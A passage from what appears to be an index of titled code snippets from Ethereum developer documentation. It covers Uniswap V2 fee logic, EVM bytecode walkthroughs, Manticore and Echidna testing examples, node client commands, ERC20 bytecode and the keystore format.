governance](/governance/)\n\n</RoadmapImageContent>\n```\n\n----------------------------------------\n\nTITLE: Gas Optimization for kLast Storage Variable in Uniswap V2 (Solidity)\nDESCRIPTION: This code optimizes gas usage by caching the storage variable kLast in memory. Storage access is significantly more expensive than memory access, so this technique reduces the gas cost of the function.\n\nLANGUAGE: solidity\nCODE:\n```\n        uint _kLast = kLast; // gas savings\n```\n\n----------------------------------------\n\nTITLE: ADDRESS Opcode in EVM\nDESCRIPTION: The ADDRESS opcode returns the address of the currently executing contract. It takes no inputs from the stack and pushes the current contract's address onto the stack.\n\nLANGUAGE: evm-assembly\nCODE:\n```\naddress(this)\n```\n\n----------------------------------------\n\nTITLE: Kurtosis Command Output When Running Ethereum Testnet\nDESCRIPTION: Sample output from Kurtosis after successfully setting up a local Ethereum testnet. It shows details about the created enclave, files artifacts, and running services with their exposed ports for client connections.\n\nLANGUAGE: python\nCODE:\n```\nStarlark code successfully run. No output was returned.\nINFO[2023-04-07T11:43:16-04:00] ==========================================================\nINFO[2023-04-07T11:43:16-04:00] ||          Created enclave: local-eth-testnet          ||\nINFO[2023-04-07T11:43:16-04:00] ==========================================================\nName:            local-eth-testnet\nUUID:            bef8c192008e\nStatus:          RUNNING\nCreation Time:   Fri, 07 Apr 2023 11:41:58 EDT\n\n========================================= Files Artifacts =========================================\nUUID           Name\ncc495a8e364a   cl-genesis-data\n7033fcdb5471   el-genesis-data\na3aef43fc738   genesis-generation-config-cl\n8e968005fc9d   genesis-generation-config-el\n3182cca9d3cd   geth-prefunded-keys\n8421166e234f   prysm-password\nd9e6e8d44d99   validator-keystore-0\n23f5ba517394   validator-keystore-1\n4d28dea40b5c   validator-keystore-2\n\n========================================== User Services ==========================================\nUUID           Name                                           Ports                                            Status\n485e6fde55ae   cl-client-0-beacon                             http: 4000/tcp -> http://127.0.0.1:65010         RUNNING\n                                                              metrics: 5054/tcp -> http://127.0.0.1:65011\n                                                              tcp-discovery: 9000/tcp -> 127.0.0.1:65012\n                                                              udp-discovery: 9000/udp -> 127.0.0.1:54455\n73739bd158b2   cl-client-0-validator                          http: 5042/tcp -> 127.0.0.1:65016                RUNNING\n                                                              metrics: 5064/tcp -> http://127.0.0.1:65017\n1b0a233cd011   cl-client-1-beacon                             http: 4000/tcp -> 127.0.0.1:65021                RUNNING\n                                                              metrics: 8008/tcp -> 127.0.0.1:65023\n                                                              tcp-discovery: 9000/tcp -> 127.0.0.1:65024\n                                                              udp-discovery: 9000/udp -> 127.0.0.1:56031\n                                                              validator-metrics: 5064/tcp -> 127.0.0.1:65022\n949b8220cd53   cl-client-1-validator                          http: 4000/tcp -> 127.0.0.1:65028                RUNNING\n                                                              metrics: 8008/tcp -> 127.0.0.1:65030\n                                                              tcp-discovery: 9000/tcp -> 127.0.0.1:65031\n                                                              udp-discovery: 9000/udp -> 127.0.0.1:60784\n                                                              validator-metrics: 5064/tcp -> 127.0.0.1:65029\nc34417bea5fa   cl-client-2                                    http: 4000/tcp -> 127.0.0.1:65037                RUNNING\n                                                              metrics: 8008/tcp -> 127.0.0.1:65035\n                                                              tcp-discovery: 9000/tcp -> 127.0.0.1:65036\n                                                              udp-discovery: 9000/udp -> 127.0.0.1:63581\ne19738e6329d   el-client-0                                    engine-rpc: 8551/tcp -> 127.0.0.1:64986          RUNNING\n                                                              rpc: 8545/tcp -> 127.0.0.1:64988\n                                                              tcp-discovery: 30303/tcp -> 127.0.0.1:64987\n                                                              udp-discovery: 30303/udp -> 127.0.0.1:55706\n                                                              ws: 8546/tcp -> 127.0.0.1:64989\ne904687449d9   el-client-1                                    engine-rpc: 8551/tcp -> 127.0.0.1:64993          RUNNING\n                                                              rpc: 8545/tcp -> 127.0.0.1:64995\n                                                              tcp-discovery: 30303/tcp -> 127.0.0.1:64994\n                                                              udp-discovery: 30303/udp -> 127.0.0.1:58096\n                                                              ws: 8546/tcp -> 127.0.0.1:64996\nad6f401126fa   el-client-2                                    engine-rpc: 8551/tcp -> 127.0.0.1:65003          RUNNING\n                                                              rpc: 8545/tcp -> 127.0.0.1:65001\n                                                              tcp-discovery: 30303/tcp -> 127.0.0.1:65000\n                                                              udp-discovery: 30303/udp -> 127.0.0.1:57269\n                                                              ws: 8546/tcp -> 127.0.0.1:65002\n12d04a9dbb69   prelaunch-data-generator-1680882122181135513   <none>                                           STOPPED\n5b45f9c0504b   prelaunch-data-generator-1680882122192182847   <none>                                           STOPPED\n3d4aaa75e218   prelaunch-data-generator-1680882122201668972   <none>                                           STOPPED\n```\n\n----------------------------------------\n\nTITLE: Computing Protocol Fee Liquidity Tokens in Uniswap V2 (Solidity)\nDESCRIPTION: This code implements the complex fee calculation formula from the Uniswap V2 whitepaper. It calculates the amount of new liquidity tokens to mint as protocol fees based on the growth in the square root of the constant product formula (k) since the last liquidity event.\n\nLANGUAGE: solidity\nCODE:\n```\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));\n                    uint denominator = rootK.mul(5).add(rootKLast);\n                    uint liquidity = numerator / denominator;\n```\n\n----------------------------------------\n\nTITLE: RETURN Operation (F3) in Ethereum EVM\nDESCRIPTION: Returns data from memory to the caller. Takes offset and length parameters to specify which memory segment to return.\n\nLANGUAGE: solidity\nCODE:\n```\nreturn mem[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Transferring ERC20 Tokens with Web3.js\nDESCRIPTION: JavaScript code that sends a transaction to transfer 100 DAI tokens (with 18 decimals) from the sender to the receiver address using the transfer function of the ERC20 contract.\n\nLANGUAGE: javascript\nCODE:\n```\ndaiToken.methods\n  .transfer(receiverAddress, \"100000000000000000000\")\n  .send({ from: senderAddress }, function (err, res) {\n    if (err) {\n      console.log(\"An error occurred\", err)\n      return\n    }\n    console.log(\"Hash of the transaction: \" + res)\n  })\n```\n\n----------------------------------------\n\nTITLE: Removing ETH Liquidity with Permit for Fee-on-Transfer Tokens in Uniswap V2\nDESCRIPTION: This function combines support for fee-on-transfer tokens with gasless permit functionality. It processes the permit signature and then calls the fee-supporting removal function, catering to tokens with transfer fees while eliminating the need for a separate approve transaction.\n\nLANGUAGE: solidity\nCODE:\n```\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external virtual override returns (uint amountETH) {\n        address pair = UniswapV2Library.pairFor(factory, token, WETH);\n        uint value = approveMax ? uint(-1) : liquidity;\n        IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n        amountETH = removeLiquidityETHSupportingFeeOnTransferTokens(\n            token, liquidity, amountTokenMin, amountETHMin, to, deadline\n        );\n    }\n```\n\n----------------------------------------\n\nTITLE: Finding Execution Paths that Throw Exceptions in Manticore\nDESCRIPTION: Example showing how to identify execution paths that result in REVERT or INVALID operations, and generate test cases for those states.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\n\nm = ManticoreEVM()\n\nwith open('example.sol') as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\n## Check if an execution ends with a REVERT or INVALID\nfor state in m.terminated_states:\n    last_tx = state.platform.transactions[-1]\n    if last_tx.result in ['REVERT', 'INVALID']:\n        print('Throw found {}'.format(m.workspace))\n        m.generate_testcase(state, 'ThrowFound')\n```\n\n----------------------------------------\n\nTITLE: Utility Function for Reading uint256 from Memory Buffer\nDESCRIPTION: Implements a helper function to extract a uint256 value from a specific position in a bytes memory buffer, used for verifying cache results.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Read a uint from a memory buffer (to make sure we get back the parameters\n    // we sent out)\n    function toUint256(bytes memory _bytes, uint256 _start) internal pure\n        returns (uint256)\n```\n\n----------------------------------------\n\nTITLE: Calculating and Minting Protocol Fees in Uniswap V2\nDESCRIPTION: This function calculates and mints liquidity tokens for protocol fees. In Uniswap V2, 0.05% of the 0.3% trading fee can be directed to a fee address specified by the factory. The fee calculation is based on the growth of the reserve product (k) since the last update.\n\nLANGUAGE: solidity\nCODE:\n```\n    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)\n    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {\n        address feeTo = IUniswapV2Factory(factory).feeTo();\n        feeOn = feeTo != address(0);\n        uint _kLast = kLast; // gas savings\n        if (feeOn) {\n            if (_kLast != 0) {\n                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));\n                uint rootKLast = Math.sqrt(_kLast);\n                if (rootK > rootKLast) {\n                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));\n                    uint denominator = rootK.mul(5).add(rootKLast);\n                    uint liquidity = numerator / denominator;\n                    if (liquidity > 0) _mint(feeTo, liquidity);\n                }\n            }\n        } else if (_kLast != 0) {\n            kLast = 0;\n        }\n    }\n```\n\n----------------------------------------\n\nTITLE: Analyzing Decompiled Ethereum Contract Function 1e7df9d3\nDESCRIPTION: This decompiled contract function is similar to a 'claim' function that validates a Merkle proof, transfers ETH to an address, and emits a log event. It checks the proof against stored data and attempts an ETH transfer with a fallback mechanism.\n\nLANGUAGE: python\nCODE:\n```\ndef unknown1e7df9d3(uint256 _param1, uint256 _param2, array _param3) payable:\n  ...\n  idx = 0\n  s = 0\n  while idx < _param3.length:\n      if idx >= mem[96]:\n          revert with 0, 50\n      _55 = mem[(32 * idx) + 128]\n      if s + sha3(mem[(32 * _param3.length) + 160 len mem[(32 * _param3.length) + 128]]) > mem[(32 * idx) + 128]:\n          ...\n          s = sha3(mem[_58 + 32 len mem[_58]])\n          continue\n      mem[mem[64] + 32] = s + sha3(mem[(32 * _param3.length) + 160 len mem[(32 * _param3.length) + 128]])\n  ...\n  if unknown2eb4a7ab != s:\n      revert with 0, 'Invalid proof'\n  ...\n  call addr(_param1) with:\n     value s wei\n       gas 30000 wei\n  if not return_data.size:\n      if not ext_call.success:\n          require ext_code.size(stor2)\n          call stor2.deposit() with:\n             value s wei\n               gas gas_remaining wei\n  ...\n  log 0xdbd5389f: addr(_param1), s, bool(ext_call.success)\n```\n\n----------------------------------------\n\nTITLE: Closing of encodeVal Function and Cache Contract\nDESCRIPTION: This snippet shows the closing braces for both the encodeVal function and the Cache contract. It marks the end of the function implementation and the entire contract definition.\n\nLANGUAGE: solidity\nCODE:\n```\n    } // encodeVal\n\n}  // Cache\n```\n\n----------------------------------------\n\nTITLE: Calculating Optimal Token B Amount in Solidity\nDESCRIPTION: Code that calculates the optimal amount of token B based on the desired amount of token A and the current reserve ratio, ensuring proportional liquidity addition.\n\nLANGUAGE: solidity\nCODE:\n```\n    } else {\n        uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n```\n\n----------------------------------------\n\nTITLE: Executing Raw Transactions in Manticore for Ethereum\nDESCRIPTION: This code demonstrates how to execute a raw transaction in Manticore, using the transaction method with caller, address, data, and value parameters. The examples show both concrete and symbolic transaction parameters.\n\nLANGUAGE: python\nCODE:\n```\nm.transaction(caller=user_account,\n              address=contract_account,\n              data=data,\n              value=value)\n```\n\nLANGUAGE: python\nCODE:\n```\nsymbolic_value = m.make_symbolic_value()\nsymbolic_data = m.make_symbolic_buffer(320)\nm.transaction(caller=user_account,\n              address=contract_address,\n              data=symbolic_data,\n              value=symbolic_value)\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies for Ethereum Development with Python\nDESCRIPTION: Terminal commands for installing the necessary dependencies for Ethereum development, including IPython for a better interactive experience and Web3.py for interacting with Ethereum.\n\nLANGUAGE: bash\nCODE:\n```\npip install ipython\npip install web3\npip install 'web3[tester]'\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode Analysis for DA Jump Destination\nDESCRIPTION: This code snippet shows the bytecode operations at jump destination 0xDA that reads a value Y from the stack (which in currentWindow() is Storage[1]), stores it in memory at position 0x80, and prepares to return it.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\nDA JUMPDEST           | Y 0xDA           \nDB PUSH1 0x40         | 0x40 Y 0xDA      \nDD MLOAD              | 0x80 Y 0xDA      \nDE SWAP1              | Y 0x80 0xDA      \nDF DUP2               | 0x80 Y 0x80 0xDA \nE0 MSTORE             | 0x80 0xDA        \nE1 PUSH1 0x20         | 0x20 0x80 0xDA \nE3 ADD                | 0xA0 0xDA      \n```\n\n----------------------------------------\n\nTITLE: ETH Migration Function for Ethereum Bridge\nDESCRIPTION: This function allows ETH to be donated to the bridge contract. It's designed for migrating ETH from an old gateway to a new gateway implementation, and is intended to be used only for one upgrade cycle.\n\nLANGUAGE: solidity\nCODE:\n```\n    /*****************************\n     * Temporary - Migrating ETH *\n     *****************************/\n\n    /**\n     * @dev Adds ETH balance to the account. This is meant to allow for ETH\n     * to be migrated from an old gateway to a new gateway.\n     * NOTE: This is left for one upgrade only so we are able to receive the migrated ETH from the\n     * old contract\n     */\n    function donateETH() external payable {}\n}\n```\n\n----------------------------------------\n\nTITLE: Running Erigon Execution Client on Ethereum Mainnet\nDESCRIPTION: Command to start Erigon on Ethereum Mainnet with specified data directory and enabled JSON-RPC endpoints. It configures authentication for connecting with a consensus client.\n\nLANGUAGE: sh\nCODE:\n```\nerigon --chain mainnet \\\n    --datadir /data/ethereum  \\\n    --http --http.api=engine,eth,web3,net \\\n    --authrpc.jwtsecret=/path/to/jwtsecret\n```\n\n----------------------------------------\n\nTITLE: Analyzing Batch Claim Function in Ethereum Contract\nDESCRIPTION: This decompiled code snippet shows a loop that iterates through all available claim windows, checking if they've been claimed and calculating rewards. It verifies storage conditions and performs mathematical calculations to determine the total amount to be claimed.\n\nLANGUAGE: python\nCODE:\n```\n  idx = 0\n  s = 0\n  while idx < currentWindow:\n      ...\n      if stor5[mem[0]]:\n          if idx == -1:\n              revert with 0, 17\n          idx = idx + 1\n          s = s\n          continue\n      ...\n      stor5[idx][addr(_param1)] = 1\n      if idx >= unknown81e580d3.length:\n          revert with 0, 50\n      mem[0] = 4\n      if unknown81e580d3[idx] and _param2 > -1 / unknown81e580d3[idx]:\n          revert with 0, 17\n      if s > !(unknown81e580d3[idx] * _param2 / 100 * 10^6):\n          revert with 0, 17\n      if idx == -1:\n          revert with 0, 17\n      idx = idx + 1\n      s = s + (unknown81e580d3[idx] * _param2 / 100 * 10^6)\n      continue\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Implementation in Solidity\nDESCRIPTION: A complete ERC20 token contract implementation that includes standard functions like transfer, approve, transferFrom, and balanceOf. The contract initializes with name 'Basic', symbol 'BSC', and 18 decimal places. It also implements SafeMath for arithmetic operations to prevent overflows.\n\nLANGUAGE: solidity\nCODE:\n```\n60806040523480156200001157600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: Enode URL Format for Ethereum Node Identification\nDESCRIPTION: Example of the enode URL format that encodes node information including the hexadecimal node-ID in the username portion, IP address as hostname, TCP port, and an optional UDP discovery port as a query parameter.\n\nLANGUAGE: plaintext\nCODE:\n```\nenode://6f8a80d14311c39f35f516fa664deaaaa13e85b2f7493f37f6144d86991ec012937307647bd3b9a82abe2974e1407241d54947bbb39763a4cac9f77166ad92a0@10.3.58.6:30303?discport=30301\n```\n\n----------------------------------------\n\nTITLE: Taşma Kontrolü Gerçekleştirme\nDESCRIPTION: Çağrı değeri ve mevcut değer toplamının taşmaya neden olup olmayacağını kontrol eden kod. Taşma durumunda işlemi geri döndürür.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n1A7 JUMPDEST\n1A8 PUSH1 0x00\n1AA DUP3\n1AB NOT\n1AC DUP3\n1AD GT\n1AE ISZERO\n1AF PUSH2 0x01df\n1B2 JUMPI\n```\n\n----------------------------------------\n\nTITLE: L2 Bridge Constructor Implementation in Solidity\nDESCRIPTION: Constructor for the L2 Standard Bridge that initializes the cross-domain messenger and stores the L1 bridge address. Unlike the L1 bridge, this contract needs to store the counterpart address.\n\nLANGUAGE: solidity\nCODE:\n```\n    /***************\n     * Constructor *\n     ***************/\n\n    /**\n     * @param _l2CrossDomainMessenger Cross-domain messenger used by this contract.\n     * @param _l1TokenBridge Address of the L1 bridge deployed to the main chain.\n     */\n    constructor(address _l2CrossDomainMessenger, address _l1TokenBridge)\n        CrossDomainEnabled(_l2CrossDomainMessenger)\n    {\n        l1TokenBridge = _l1TokenBridge;\n    }\n```\n\n----------------------------------------\n\nTITLE: MAC Calculation for Web3 Secret Storage\nDESCRIPTION: JavaScript representation of the MAC calculation algorithm for Web3 Secret Storage. The MAC is calculated as the Keccak-256 hash of the concatenation of the second-leftmost 16 bytes of the derived key with the ciphertext.\n\nLANGUAGE: javascript\nCODE:\n```\nKECCAK(DK[16..31] ++ <ciphertext>)\n```\n\n----------------------------------------\n\nTITLE: Creating Echidna Configuration for Corpus Collection\nDESCRIPTION: YAML configuration file that enables Echidna to collect a corpus of transactions during testing and stores them in the specified directory.\n\nLANGUAGE: yaml\nCODE:\n```\ncoverage: true\ncorpusDir: \"corpus-magic\"\n```\n\n----------------------------------------\n\nTITLE: Setting up Solidity in Docker Container\nDESCRIPTION: Commands to run inside the Docker container to select Solidity compiler version 0.5.11 and change to the working directory.\n\nLANGUAGE: bash\nCODE:\n```\nsolc-select 0.5.11\ncd /home/trufflecon/\n```\n\n----------------------------------------\n\nTITLE: Example Merkle Patricia Trie Structure for Ethereum\nDESCRIPTION: A concrete example showing the structure of a Merkle Patricia Trie with four key-value pairs. This demonstrates how paths are encoded as bytes and how nodes reference each other using hash pointers.\n\nLANGUAGE: python\nCODE:\n```\n<64 6f> : 'verb'\n<64 6f 67> : 'puppy'\n<64 6f 67 65> : 'coins'\n<68 6f 72 73 65> : 'stallion'\n```\n\nLANGUAGE: python\nCODE:\n```\nrootHash: [ <16>, hashA ]\nhashA:    [ <>, <>, <>, <>, hashB, <>, <>, <>, [ <20 6f 72 73 65>, 'stallion' ], <>, <>, <>, <>, <>, <>, <>, <> ]\nhashB:    [ <00 6f>, hashC ]\nhashC:    [ <>, <>, <>, <>, <>, <>, hashD, <>, <>, <>, <>, <>, <>, <>, <>, <>, 'verb' ]\nhashD:    [ <17>, [ <>, <>, <>, <>, <>, <>, [ <35>, 'coins' ], <>, <>, <>, <>, <>, <>, <>, <>, <>, 'puppy' ] ]\n```\n\n----------------------------------------\n\nTITLE: Implementing SSZ Serialization for a Composite Structure in Rust\nDESCRIPTION: This example demonstrates how SSZ serializes a Rust structure containing both fixed-length (u64) and variable-length (Vec<u8>) elements. It shows how the serialized object uses offsets for variable-length data that gets placed at the end of the serialized representation.\n\nLANGUAGE: Rust\nCODE:\n```\nstruct Dummy {\n\n    number1: u64,\n    number2: u64,\n    vector: Vec<u8>,\n    number3: u64\n}\n\ndummy = Dummy{\n\n    number1: 37,\n    number2: 55,\n    vector: vec![1,2,3,4],\n    number3: 22,\n}\n\nserialized = ssz.serialize(dummy)\n```\n\n----------------------------------------\n\nTITLE: Defining Ethash Constants in Python\nDESCRIPTION: Constants used in the Ethash algorithm that define parameters like word size, dataset and cache sizes, growth rates, and other operational values necessary for the mining process.\n\nLANGUAGE: python\nCODE:\n```\nWORD_BYTES = 4                    # bytes in word\nDATASET_BYTES_INIT = 2**30        # bytes in dataset at genesis\nDATASET_BYTES_GROWTH = 2**23      # dataset growth per epoch\nCACHE_BYTES_INIT = 2**24          # bytes in cache at genesis\nCACHE_BYTES_GROWTH = 2**17        # cache growth per epoch\nCACHE_MULTIPLIER=1024             # Size of the DAG relative to the cache\nEPOCH_LENGTH = 30000              # blocks per epoch\nMIX_BYTES = 128                   # width of mix\nHASH_BYTES = 64                   # hash length in bytes\nDATASET_PARENTS = 256             # number of parents of each dataset element\nCACHE_ROUNDS = 3                  # number of rounds in cache production\nACCESSES = 64                     # number of accesses in hashimoto loop\n```\n\n----------------------------------------\n\nTITLE: Version 2 Web3 Keystore Example JSON\nDESCRIPTION: An example of the Web3 keystore version 2 format, which was a previous implementation. This shows the structure differences compared to version 3, using AES-128-CBC and Scrypt for key derivation.\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"crypto\": {\n    \"cipher\": \"aes-128-cbc\",\n    \"ciphertext\": \"07533e172414bfa50e99dba4a0ce603f654ebfa1ff46277c3e0c577fdc87f6bb4e4fe16c5a94ce6ce14cfa069821ef9b\",\n    \"cipherparams\": {\n      \"iv\": \"16d67ba0ce5a339ff2f07951253e6ba8\"\n    },\n    \"kdf\": \"scrypt\",\n    \"kdfparams\": {\n      \"dklen\": 32,\n      \"n\": 262144,\n      \"p\": 1,\n      \"r\": 8,\n      \"salt\": \"06870e5e6a24e183a5c807bd1c43afd86d573f7db303ff4853d135cd0fd3fe91\"\n    },\n    \"mac\": \"8ccded24da2e99a11d48cda146f9cc8213eb423e2ea0d8427f41c3be414424dd\",\n    \"version\": 1\n  },\n  \"id\": \"0498f19a-59db-4d54-ac95-33901b4f1870\",\n  \"version\": 2\n}\n```\n\n----------------------------------------\n\nTITLE: Uninstalling a Filter with eth_uninstallFilter\nDESCRIPTION: Example of uninstalling a filter by its ID when it's no longer needed. The request includes the filter ID, and the response indicates whether the filter was successfully removed.\n\nLANGUAGE: javascript\nCODE:\n```\nparams: [\n 